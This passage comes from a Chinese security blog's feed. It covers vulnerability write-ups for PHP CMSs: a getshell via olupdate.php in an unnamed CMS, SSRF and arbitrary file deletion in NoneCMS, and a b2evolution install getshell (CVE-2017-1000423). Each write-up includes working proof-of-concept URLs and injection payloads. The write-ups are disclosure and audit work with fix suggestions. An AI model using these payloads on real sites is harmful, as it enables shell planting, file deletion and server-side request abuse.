class="regexp">//</span>localhost<span class="regexp">/某CMS 5.3.18/</span>xxx<span class="regexp">/index.php</span></span><br></pre></td></tr></table></figure></p><h2 id="0x05-olupdate文件缺陷导致Getshell"><a href="#0x05-olupdate文件缺陷导致Getshell" class="headerlink" title="0x05 olupdate文件缺陷导致Getshell"></a>0x05 olupdate文件缺陷导致Getshell</h2><h3 id="1-漏洞点-1"><a href="#1-漏洞点-1" class="headerlink" title="1. 漏洞点"></a>1. 漏洞点</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/admin/system/olupdate.phpwen文件中，当$action=sql,$sql!=No Date且$sqlfile不是数组时进入如下过程</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#326-360行</span></span><br><span class="line"><span class="variable">$num</span>=1;</span><br><span class="line"><span class="variable">$random</span> = met_rand(6);</span><br><span class="line"><span class="variable">$date</span>=date(<span class="string">'Ymd'</span>,time());</span><br><span class="line">require_once <span class="string">'../system/database/global.func.php'</span>;</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    <span class="variable">$sqldump</span> = <span class="string">''</span>;</span><br><span class="line">    <span class="variable">$startrow</span> = <span class="string">''</span>;</span><br><span class="line">    <span class="variable">$tables</span>=tableprearray(<span class="variable">$tablepre</span>);</span><br><span class="line">    <span class="variable">$sizelimit</span>=2048;</span><br><span class="line">    <span class="variable">$tableid</span> = isset(<span class="variable">$tableid</span>) ? <span class="variable">$tableid</span> - 1 : 0;</span><br><span class="line">    <span class="variable">$startfrom</span> = isset(<span class="variable">$startfrom</span>) ? intval(<span class="variable">$startfrom</span>) : 0;</span><br><span class="line">    <span class="variable">$tablenumber</span> = count(<span class="variable">$tables</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="variable">$tableid</span>; <span class="variable">$i</span> &lt; <span class="variable">$tablenumber</span> &amp;&amp; strlen(<span class="variable">$sqldump</span>) &lt; <span class="variable">$sizelimit</span> * 1000; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$sqldump</span> .= sql_dumptable(<span class="variable">$tables</span>[<span class="variable">$i</span>], <span class="variable">$startfrom</span>, strlen(<span class="variable">$sqldump</span>));</span><br><span class="line">        <span class="variable">$startfrom</span> = 0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$startfrom</span> = <span class="variable">$startrow</span>;</span><br><span class="line">    <span class="variable">$tableid</span> = <span class="variable">$i</span>;</span><br><span class="line">    <span class="keyword">if</span>(trim(<span class="variable">$sqldump</span>))&#123;</span><br><span class="line">        <span class="variable">$sqlfile</span>[]=<span class="variable">$bakfile</span> = <span class="string">"../update/<span class="variable">$addr</span>/&#123;<span class="variable">$con_db_name</span>&#125;_&#123;<span class="variable">$date</span>&#125;_&#123;<span class="variable">$random</span>&#125;_&#123;<span class="variable">$num</span>&#125;.sql"</span>;</span><br><span class="line">        <span class="variable">$version</span>=<span class="string">'version:'</span>.<span class="variable">$metcms_v</span>;</span><br><span class="line">        <span class="variable">$sqldump</span> = <span class="string">"#某CMS .cn Created &#123;<span class="variable">$version</span>&#125; \n#&#123;<span class="variable">$met_weburl</span>&#125;\n#&#123;<span class="variable">$tablepre</span>&#125;\n#&#123;<span class="variable">$met_webkeys</span>&#125;\n# --------------------------------------------------------\n\n\n"</span>.<span class="variable">$sqldump</span>;</span><br><span class="line">        <span class="keyword">if</span>(!file_put_contents(<span class="variable">$bakfile</span>, <span class="variable">$sqldump</span>))&#123;</span><br><span class="line">            dl_error(<span class="variable">$lang_updaterr2</span>.<span class="string">"(&#123;<span class="variable">$adminfile</span>&#125;/update/<span class="variable">$addr</span>/&#123;<span class="variable">$con_db_name</span>&#125;_&#123;<span class="variable">$date</span>&#125;_&#123;<span class="variable">$random</span>&#125;_&#123;<span class="variable">$num</span>&#125;.sql)"</span>,<span class="variable">$type</span>,<span class="variable">$olid</span>,<span class="variable">$ver</span>,<span class="variable">$addr</span>,<span class="variable">$action</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$num</span>++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(trim(<span class="variable">$sqldump</span>));</span><br><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$sqlfile</span>)) <span class="variable">$string</span> = <span class="string">"&lt;?php\n \$sqlfile = "</span>.var_export(<span class="variable">$sqlfile</span>, <span class="literal">true</span>).<span class="string">"; ?&gt;"</span>;</span><br><span class="line">filetest(<span class="string">"../update/<span class="variable">$addr</span>/sqlist.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(!file_put_contents(<span class="string">"../update/<span class="variable">$addr</span>/sqlist.php"</span>,<span class="variable">$string</span>))&#123;</span><br><span class="line">    dl_error(<span class="variable">$lang_updaterr2</span>.<span class="string">"(&#123;<span class="variable">$adminfile</span>&#125;/update/<span class="variable">$addr</span>/sqlist.php)"</span>,<span class="variable">$type</span>,<span class="variable">$olid</span>,<span class="variable">$ver</span>,<span class="variable">$addr</span>,<span class="variable">$action</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时由于sqlfile不是数组，即is_array($sqlfile)不成立，导致$string没有初始化，可以任意修改，接着调用file_put_contents将string的值写到/update/$addr/sqlist.php文件。</p><p><em>PS:这里有一个小点,由于输入控制sqlfile不是数组，第345行执行$sqlfile[]=$bakfile = “../update/$addr/{$con_db_name}<em>{$date}</em>{$random}_{$num}.sql”;会导致给字符串赋值报错，导致无法执行到后面的Getshell部分。所以需要构造payload使得trim($sqldump)为空，即$sqldump值为空，从而跳过$sqlfile[]赋值部分，这里构造tableid=1000(其实只要&gt;=44即可)</em></p><p>最后的payload结构如下：<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta-keyword">/admin/</span>system/olupdate.php?action=sql<span class="variable">&amp;sqlfile</span>=<span class="number">1</span><span class="variable">&amp;string</span>=shell内容<span class="variable">&amp;addr</span>=shell的目录<span class="variable">&amp;tableid</span>=<span class="number">1000</span></span><br></pre></td></tr></table></figure></p><h3 id="2-POC-参数addr为生成shell的目录，生成shell的文件名sqlist-php不可控"><a href="#2-POC-参数addr为生成shell的目录，生成shell的文件名sqlist-php不可控" class="headerlink" title="2.POC (参数addr为生成shell的目录，生成shell的文件名sqlist.php不可控)"></a>2.POC (参数addr为生成shell的目录，生成shell的文件名sqlist.php不可控)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//xxx.com/admin/system/olupdate.php?action=sql&amp;sqlfile=1&amp;string=<span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span>&amp;addr=12313&amp;tableid=1000</span></span><br></pre></td></tr></table></figure><p>执行后的shell地址：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>xxx.com<span class="regexp">/admin/u</span>pdate<span class="regexp">/12313/</span>sqlist.php</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;首发于：&lt;a href=&quot;https://xz.aliyun.com/t/2096&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;先知社区: 某CMS 5.X版本GETSHELL漏洞合集&lt;/a&gt;&lt;br&gt;2018年1月底某CMS官方隆重发布6.0版本，调整了之前“漏洞百出”的框架结构，修（杜）复（绝）了多个5.X的版本后台Gestshell漏洞。&lt;br&gt;
    
    </summary>
    
      <category term="代码审计" scheme="http://blackwolfsec.cc/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="PHP" scheme="http://blackwolfsec.cc/tags/PHP/"/>
    
      <category term="代码审计" scheme="http://blackwolfsec.cc/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="Security" scheme="http://blackwolfsec.cc/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>NoneCMS1.3版本SSRF漏洞</title>
    <link href="http://blackwolfsec.cc/2018/01/23/Nonecms_ssrf/"/>
    <id>http://blackwolfsec.cc/2018/01/23/Nonecms_ssrf/</id>
    <published>2018-01-23T02:30:20.000Z</published>
    <updated>2018-01-23T06:55:00.654Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>NoneCMS添加文章处过滤不严存在SSRF漏洞<br><a id="more"></a></p><h2 id="0x01漏洞分析"><a href="#0x01漏洞分析" class="headerlink" title="0x01漏洞分析"></a>0x01漏洞分析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#application/admin/controller/Article.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">copy</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (request()-&gt;isAjax()) &#123;</span><br><span class="line">            $url = input(<span class="string">'post.url'</span>);</span><br><span class="line">            $cid = input(<span class="string">'post.cid'</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!$url || !substr_count($url, <span class="string">'csdn'</span>)) &#123;</span><br><span class="line">                <span class="keyword">exit</span>(json_encode([<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'msg'</span> =&gt; <span class="string">'请输入csdn博客文章地址'</span>, <span class="string">'url'</span> =&gt; <span class="string">''</span>]));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!$cid) &#123;</span><br><span class="line">                <span class="keyword">exit</span>(json_encode([<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'msg'</span> =&gt; <span class="string">'请先选择分类'</span>, <span class="string">'url'</span> =&gt; <span class="string">''</span>]));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                \phpQuery::newDocumentFile($url);</span><br><span class="line">                $title = pq(<span class="string">'.link_title a'</span>)-&gt;text();</span><br><span class="line">                <span class="keyword">if</span> (!$title) &#123;</span><br><span class="line">                    $title = pq(<span class="string">'.list_c_t a'</span>)-&gt;text();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!$title) &#123;</span><br><span class="line">                    $title = pq(<span class="string">'h1.csdn_top'</span>)-&gt;text();</span><br><span class="line">                &#125;</span><br><span class="line">                $content = pq(<span class="string">'#article_content'</span>)-&gt;text();</span><br><span class="line"></span><br><span class="line">                <span class="comment">//如果抓取不到主内容</span></span><br><span class="line">                <span class="keyword">if</span> (!$content) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"文章不存在或禁止爬虫"</span>);</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">                $params[<span class="string">'cid'</span>] = $cid;</span><br><span class="line">                $params[<span class="string">'content'</span>] = $content;</span><br><span class="line">                $params[<span class="string">'title'</span>] = $title;</span><br><span class="line">                $params[<span class="string">'publishtime'</span>] = <span class="string">''</span>;</span><br><span class="line">                $params[<span class="string">'description'</span>] = trim(strip_tags($content));</span><br><span class="line">                $params[<span class="string">'copyfrom'</span>] = $url;</span><br><span class="line">                $article = <span class="keyword">new</span> articleModel();</span><br><span class="line">                <span class="keyword">if</span> ($article-&gt;data($params,<span class="keyword">true</span>)-&gt;save()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> [<span class="string">'status'</span> =&gt; <span class="number">1</span>, <span class="string">'msg'</span> =&gt; <span class="string">'转载成功'</span>, <span class="string">'url'</span> =&gt; url(<span class="string">'article/index'</span>, [<span class="string">'id'</span> =&gt; $cid])];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> [<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'msg'</span> =&gt; <span class="string">'转载失败'</span>, <span class="string">'url'</span> =&gt; <span class="string">''</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">                <span class="keyword">return</span> [<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'msg'</span> =&gt; <span class="string">'添加失败：'</span> . $e-&gt;getMessage(), <span class="string">'url'</span> =&gt; <span class="string">''</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>1.当请求copy方法时首先判断请求方式为Ajax，然后检测要求存在url参数,并且url中包含csdn字符串即可（很容易利用<code>?csdn</code>绕过）。<br>2.调用<code>\phpQuery::newDocumentFile</code>，函数内容如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">newDocumentFile</span><span class="params">($file, $contentType = null)</span> </span>&#123;</span><br><span class="line">$documentID = <span class="keyword">self</span>::createDocumentWrapper(</span><br><span class="line">file_get_contents($file), $contentType</span><br><span class="line">);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> phpQueryObject($documentID);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>请求目标url,内部调用了file_get_contents请求。<br>3.由此可见，存在ssrf漏洞。</p><h2 id="0x02POC"><a href="#0x02POC" class="headerlink" title="0x02POC:"></a>0x02POC:</h2><p><img src="http://blackwolfsec.cc/static/picture/nonecms_ssrf_1.png" alt="payload"></p><p>目标服务器成功收到请求</p><p><img src="http://blackwolfsec.cc/static/picture/nonecms_ssrf_2.png" alt="ssrf"></p><h2 id="0x03小结"><a href="#0x03小结" class="headerlink" title="0x03小结"></a>0x03小结</h2><p>需要管理员登录后才能利用，且由于请求目标不是CSDN，会导致copy函数后面的处理获取不到有效数据，会提示“服务器出错”，但是实际请求已经成功发送出去了。</p><h2 id="0x04修复建议"><a href="#0x04修复建议" class="headerlink" title="0x04修复建议"></a>0x04修复建议</h2><p>利用parse_url提取URL的域名是否属于CSDN。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00前言&quot;&gt;&lt;a href=&quot;#0x00前言&quot; class=&quot;headerlink&quot; title=&quot;0x00前言&quot;&gt;&lt;/a&gt;0x00前言&lt;/h2&gt;&lt;p&gt;NoneCMS添加文章处过滤不严存在SSRF漏洞&lt;br&gt;
    
    </summary>
    
      <category term="代码审计" scheme="http://blackwolfsec.cc/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="PHP" scheme="http://blackwolfsec.cc/tags/PHP/"/>
    
      <category term="代码审计" scheme="http://blackwolfsec.cc/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="CVE" scheme="http://blackwolfsec.cc/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>NoneCMS后台任意文件删除</title>
    <link href="http://blackwolfsec.cc/2018/01/22/Nonecms/"/>
    <id>http://blackwolfsec.cc/2018/01/22/Nonecms/</id>
    <published>2018-01-22T13:30:20.000Z</published>
    <updated>2018-01-23T06:50:53.930Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>这两天学习Thinkphp5.1的开发手册，顺便审计一下<a href="http://www.5none.com/" target="_blank" rel="noopener">NoneCMS</a>，利用框架的安全性避免了不少的问题，但还是发现一枚任意文件删除漏洞。<br><a id="more"></a></p><h2 id="0x01漏洞分析"><a href="#0x01漏洞分析" class="headerlink" title="0x01漏洞分析"></a>0x01漏洞分析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#application/admin/controller/Main.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!input(<span class="string">'?param.act'</span>)) &#123;</span><br><span class="line">            $file = request()-&gt;file(<span class="string">'pic_url'</span>);</span><br><span class="line"></span><br><span class="line">            $info = $file</span><br><span class="line">                -&gt;validate([<span class="string">'size'</span>=&gt; <span class="number">1024</span>*<span class="number">1024</span>*<span class="number">2</span>,<span class="string">'ext'</span>=&gt;[<span class="string">'jpg'</span>, <span class="string">'png'</span>, <span class="string">'jpeg'</span>, <span class="string">'gif'</span>, <span class="string">'bmp'</span>]])</span><br><span class="line">                -&gt;move(Env::get(<span class="string">'root_path'</span>) . <span class="string">'public/uploads'</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ($info) &#123;</span><br><span class="line">                <span class="comment">// 成功上传后 获取上传信息</span></span><br><span class="line">                $save_name = $info-&gt;getSaveName();</span><br><span class="line">                $realpath =  __ROOT__.<span class="string">'/uploads/'</span> . $save_name;</span><br><span class="line">                <span class="keyword">exit</span>(json_encode([<span class="string">'status'</span> =&gt; <span class="number">1</span>, <span class="string">'path'</span> =&gt; $realpath, <span class="string">'save_name'</span> =&gt; $save_name]));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 上传失败获取错误信息</span></span><br><span class="line">                <span class="keyword">exit</span>(json_encode([<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'error'</span> =&gt; $file-&gt;getError()]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//删除图片</span></span><br><span class="line">            $img_dir = input(<span class="string">'param.path'</span>);</span><br><span class="line">            $real_path = str_replace(Env::get(<span class="string">'root_path'</span>),<span class="string">''</span>,$img_dir);</span><br><span class="line">            $path = str_replace([<span class="string">'/..\/'</span>,<span class="string">'/../'</span>],<span class="string">'/'</span>,Env::get(<span class="string">'root_path'</span>).$real_path);</span><br><span class="line">            <span class="keyword">echo</span>  $path ;</span><br><span class="line">            <span class="keyword">if</span> (@unlink($path)) &#123;</span><br><span class="line">                <span class="keyword">exit</span>(json_encode([<span class="string">'status'</span> =&gt; <span class="number">1</span>, <span class="string">'msg'</span> =&gt; <span class="string">'删除成功'</span>]));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">exit</span>(json_encode([<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'msg'</span> =&gt; <span class="string">'删除失败'</span>]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>1.当请求upload方法时，如果if (!input(‘?param.act’))不成立，即存在act参数的情况下，进入else分支。<br>2.此时将path参数的值经过str_replace替换后传入unlink函数，直接删除，由于过滤不严导致任意文件删除。<br>3.可以采用绝对路径的方式或者windows下用<code>..\</code>绕过str_replace的限制。</p><h2 id="0x02任意文件删除POC"><a href="#0x02任意文件删除POC" class="headerlink" title="0x02任意文件删除POC:"></a>0x02任意文件删除POC:</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="string">//127.0.0.1/NoneCMS/public/admin/main/upload/act/1</span>?path=public/install/install.lock</span><br><span class="line"></span><br><span class="line">http:<span class="string">//127.0.0.1/NoneCMS/public/admin/main/upload/act/1</span>?path=<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\test.txt</span><br></pre></td></tr></table></figure><h2 id="0x03小结"><a href="#0x03小结" class="headerlink" title="0x03小结"></a>0x03小结</h2><p>这个漏洞需要至少能够登录后台的管理员登录才能利用。</p><h2 id="0x04修复建议"><a href="#0x04修复建议" class="headerlink" title="0x04修复建议"></a>0x04修复建议</h2><ul><li>此处功能为删除图片，可以严格检查删除文件名的后缀是否为图片</li><li>同时过滤<code>..\</code>和<code>../</code></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00前言&quot;&gt;&lt;a href=&quot;#0x00前言&quot; class=&quot;headerlink&quot; title=&quot;0x00前言&quot;&gt;&lt;/a&gt;0x00前言&lt;/h2&gt;&lt;p&gt;这两天学习Thinkphp5.1的开发手册，顺便审计一下&lt;a href=&quot;http://www.5none.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;NoneCMS&lt;/a&gt;，利用框架的安全性避免了不少的问题，但还是发现一枚任意文件删除漏洞。&lt;br&gt;
    
    </summary>
    
      <category term="代码审计" scheme="http://blackwolfsec.cc/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="PHP" scheme="http://blackwolfsec.cc/tags/PHP/"/>
    
      <category term="代码审计" scheme="http://blackwolfsec.cc/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="CVE" scheme="http://blackwolfsec.cc/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>B2evolution安装过程过滤不严导致Getshell漏洞分析（CVE-2017-1000423）</title>
    <link href="http://blackwolfsec.cc/2018/01/17/b2evolution_getshell/"/>
    <id>http://blackwolfsec.cc/2018/01/17/b2evolution_getshell/</id>
    <published>2018-01-17T13:36:20.000Z</published>
    <updated>2018-01-17T13:48:23.817Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>好久没有更新博客了，看到b2evolution6.6.0 - 6.8.10被爆出安装过程过滤不严导致Getshell漏洞（CVE-2017-1000423），简单分析一下。<br><a id="more"></a></p><h2 id="0x01复现环境搭建"><a href="#0x01复现环境搭建" class="headerlink" title="0x01复现环境搭建"></a>0x01复现环境搭建</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/b2evolution/b2evolution.git</span><br><span class="line"><span class="built_in">cd</span> b2evolution</span><br><span class="line">git checkout -b 6.8.10</span><br></pre></td></tr></table></figure><h2 id="0x02分析过程"><a href="#0x02分析过程" class="headerlink" title="0x02分析过程"></a>0x02分析过程</h2><p>1.请求<a href="http://localhost/b2evolution/install/index.php?action=start" target="_blank" rel="noopener">http://localhost/b2evolution/install/index.php?action=start</a></p><p>2.输入Base URL的值如下（需要有效的数据库配置）</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/b2evolution/</span>\\<span class="string">';phpinfo();//</span></span><br></pre></td></tr></table></figure><p>3.处理过程跟进install/_functions_install.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#第1899行</span></span><br><span class="line"><span class="keyword">array</span>(</span><br><span class="line"><span class="string">"\$db_config = array(\n"</span></span><br><span class="line">.<span class="string">"\t'user'     =&gt; '"</span>.str_replace( <span class="keyword">array</span>( <span class="string">"'"</span>, <span class="string">"\$"</span> ), <span class="keyword">array</span>( <span class="string">"\'"</span>, <span class="string">"\\$"</span> ), $params[<span class="string">'db_user'</span>] ).<span class="string">"',\$1"</span></span><br><span class="line">.<span class="string">"\t'password' =&gt; '"</span>.str_replace( <span class="keyword">array</span>( <span class="string">"'"</span>, <span class="string">"\$"</span> ), <span class="keyword">array</span>( <span class="string">"\'"</span>, <span class="string">"\\$"</span> ), $params[<span class="string">'db_password'</span>] ).<span class="string">"',\$2"</span></span><br><span class="line">.<span class="string">"\t'name'     =&gt; '"</span>.str_replace( <span class="keyword">array</span>( <span class="string">"'"</span>, <span class="string">"\$"</span> ), <span class="keyword">array</span>( <span class="string">"\'"</span>, <span class="string">"\\$"</span> ), $params[<span class="string">'db_name'</span>] ).<span class="string">"',\$3"</span></span><br><span class="line">.<span class="string">"\t'host'     =&gt; '"</span>.str_replace( <span class="keyword">array</span>( <span class="string">"'"</span>, <span class="string">"\$"</span> ), <span class="keyword">array</span>( <span class="string">"\'"</span>, <span class="string">"\\$"</span> ), $params[<span class="string">'db_host'</span>] ).<span class="string">"',\$4"</span>,</span><br><span class="line"><span class="string">"tableprefix = '"</span>.str_replace( <span class="string">"'"</span>, <span class="string">"\'"</span>, $params[<span class="string">'db_tableprefix'</span>] ).<span class="string">"';"</span>,</span><br><span class="line"><span class="string">"baseurl = '"</span>.str_replace( <span class="string">"'"</span>, <span class="string">"\'"</span>, $params[<span class="string">'baseurl'</span>] ).<span class="string">"';"</span>,</span><br><span class="line"><span class="string">"admin_email = '"</span>.str_replace( <span class="string">"'"</span>, <span class="string">"\'"</span>, $params[<span class="string">'admin_email'</span>] ).<span class="string">"';"</span>,</span><br><span class="line"><span class="string">'config_is_done = 1;'</span>,</span><br><span class="line">), $conf );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write new contents:</span></span><br><span class="line"><span class="keyword">if</span>( save_to_file( $conf, $conf_filepath, <span class="string">'w'</span> ) )</span><br><span class="line">&#123;</span><br><span class="line">display_install_messages( sprintf( T_(<span class="string">'Your configuration file &lt;code&gt;%s&lt;/code&gt; has been successfully created.'</span>).<span class="string">'&lt;/p&gt;'</span>, $conf_filepath ), <span class="string">'success'</span> );</span><br><span class="line"></span><br><span class="line">$tableprefix = $params[<span class="string">'db_tableprefix'</span>];</span><br><span class="line">$baseurl = $params[<span class="string">'baseurl'</span>];</span><br><span class="line">$admin_email = $params[<span class="string">'admin_email'</span>];</span><br><span class="line">$config_is_done = <span class="number">1</span>;</span><br><span 